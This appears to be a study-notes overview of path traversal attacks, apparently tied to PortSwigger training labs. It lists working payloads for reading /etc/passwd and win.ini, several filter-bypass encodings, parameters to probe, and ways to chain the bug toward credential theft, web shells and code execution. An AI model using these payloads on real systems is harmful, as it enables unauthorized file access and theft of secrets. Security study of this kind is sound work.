# Path traversal (directory traversal) — topic overview & router

A file parameter is concatenated into a filesystem path without sanitization, so `../` sequences walk out of the intended directory and read (sometimes write) arbitrary files: `/etc/passwd`, app source/config, back-end creds, secrets. Write access → modify app behavior → RCE. Impact: High–Critical.

## 30-second quick reference

```
filename=../../../etc/passwd                 # basic Unix
filename=..\..\..\windows\win.ini            # Windows (both / and \ work)
filename=/etc/passwd                         # absolute path (no traversal needed)
filename=....//....//....//etc/passwd        # nested (defeats one-pass strip)
filename=..%252f..%252f..%252fetc/passwd     # double URL-encode (superfluous decode)
filename=/var/www/images/../../../etc/passwd # satisfy required base-folder start
filename=../../../etc/passwd%00.png          # null byte to drop required extension
```

## Decision map

| Defense observed | Go to | Bypass |
|---|---|---|
| none | [Basics](Basics/) | `../../../etc/passwd` |
| `../` stripped/blocked | [Filter-bypasses](Filter-bypasses/) | absolute path; nested `....//`; URL/double-encode; base-folder prefix; null byte |

## Sub-technique folders
- `Basics/` — the core `../` read of an arbitrary file (1 lab)
- `Filter-bypasses/` — absolute path, nested sequences, (double) URL-encoding, start-of-path validation, null-byte extension bypass (5 labs)

## Root cause
User input flows into a filesystem API (`open`/`read`) appended to a base dir. `../` is a valid relative-path segment; without canonicalization + base-dir check, it escapes the sandbox.

## Find it
- Params that name files/images/templates/downloads: `filename`, `file`, `path`, `template`, `doc`, `page`, `lang`, `download`. Also multipart `filename`, and paths in headers.
- Probe `../../../etc/passwd` (Unix) / `..\..\..\windows\win.ini` (Windows); a recognizable file body = win. Burp Intruder list "Fuzzing - path traversal".

## Chaining
- Read source/config → creds → [SQL-injection](../SQL-injection/) / [Authentication](../Authentication/) / cloud.
- Read secrets/keys → [JWT-attacks](../JWT-attacks/), session forging.
- Write primitive → web-shell → RCE; LFI→RCE via log poisoning / PHP wrappers.
- SSRF↔file: `file://` scheme in [SSRF](../SSRF/); also reachable via [XXE-injection](../XXE-injection/).

## Tools
- **Burp Repeater/Intruder** ("Fuzzing - path traversal" payloads), **Burp Scanner**.

## References
- https://portswigger.net/web-security/file-path-traversal
